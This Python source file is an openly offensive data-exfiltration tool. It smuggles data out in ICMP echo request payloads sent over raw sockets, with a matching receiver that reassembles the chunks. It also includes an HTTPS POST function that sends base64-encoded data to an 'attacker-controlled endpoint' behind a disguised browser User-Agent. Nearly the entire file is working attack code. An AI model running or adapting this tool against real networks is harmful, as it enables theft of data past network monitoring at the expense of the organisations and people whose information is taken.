# -*- coding: utf-8 -*-
"""ICMP exfiltration -- smuggle data in echo request/reply payloads.

Author: zxwn
"""
import struct, socket, time, os


def create_icmp_packet(seq: int, payload: bytes) -> bytes:
    """Build ICMP echo request packet with payload."""
    # ICMP header: type(8) code(0) checksum(0) id seq
    icmp_type = 8  # Echo request
    icmp_code = 0
    icmp_id = os.getpid() & 0xFFFF

    header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, icmp_id, seq)
    # Checksum
    checksum = _internet_checksum(header + payload)
    header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, seq)
    return header + payload


def _internet_checksum(data: bytes) -> int:
    """Calculate internet checksum (RFC 1071)."""
    total = 0
    for i in range(0, len(data) - 1, 2):
        total += (data[i] << 8) + data[i+1]
    if len(data) % 2:
        total += data[-1] << 8
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return ~total & 0xFFFF


def icmp_send(target: str, data: bytes, chunk_size: int = 32, delay: float = 0.1) -> int:
    """Send data via ICMP echo request packets (requires raw socket / admin)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[!] ICMP requires root/admin privileges")
        return 0

    total_chunks = (len(data) + chunk_size - 1) // chunk_size

    # Send header: total chunks + original size
    header = struct.pack("!HI", total_chunks, len(data))
    sock.sendto(create_icmp_packet(0, header), (target, 0))

    for i in range(total_chunks):
        chunk = data[i * chunk_size : (i + 1) * chunk_size]
        pkt = create_icmp_packet(i + 1, chunk)
        sock.sendto(pkt, (target, 0))
        time.sleep(delay)

    sock.close()
    return len(data)


def icmp_receive(bind_addr: str = "0.0.0.0", timeout: int = 30) -> bytes:
    """Receive ICMP exfiltrated data."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        return b""

    sock.settimeout(timeout)
    sock.bind((bind_addr, 0))

    # Receive header packet first
    try:
        data, addr = sock.recvfrom(65535)
        icmp_data = data[20:]  # Skip IP header
        _, _, _, _, seq = struct.unpack("!BBHHH", icmp_data[:8])
        payload = icmp_data[8:]
        total_chunks, total_size = struct.unpack("!HI", payload[:6])
    except socket.timeout:
        return b""

    chunks = {}
    start = time.time()
    while len(chunks) < total_chunks and time.time() - start < timeout:
        try:
            data, addr = sock.recvfrom(65535)
            icmp_data = data[20:]
            _, _, _, _, seq = struct.unpack("!BBHHH", icmp_data[:8])
            payload = icmp_data[8:]
            if seq > 0 and seq <= total_chunks:
                chunks[seq - 1] = payload
        except socket.timeout:
            break

    sock.close()

    # Reassemble
    ordered = [chunks[i] for i in sorted(chunks.keys())]
    result = b"".join(ordered)[:total_size]
    return result


def http_exfil_post(url: str, data: bytes, headers: dict = None) -> bool:
    """Exfiltrate via HTTPS POST to attacker-controlled endpoint."""
    import urllib.request, base64
    encoded = base64.b64encode(data).decode()
    body = '{{"id":"{}","d":"{}"}}'.format(os.urandom(4).hex(), encoded)
    req = urllib.request.Request(
        url,
        data=body.encode(),
        headers=headers or {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
    )
    try:
        urllib.request.urlopen(req, timeout=10)
        return True
    except:
        return False


if __name__ == "__main__":
    print("[icmp_exfil] Loaded.")
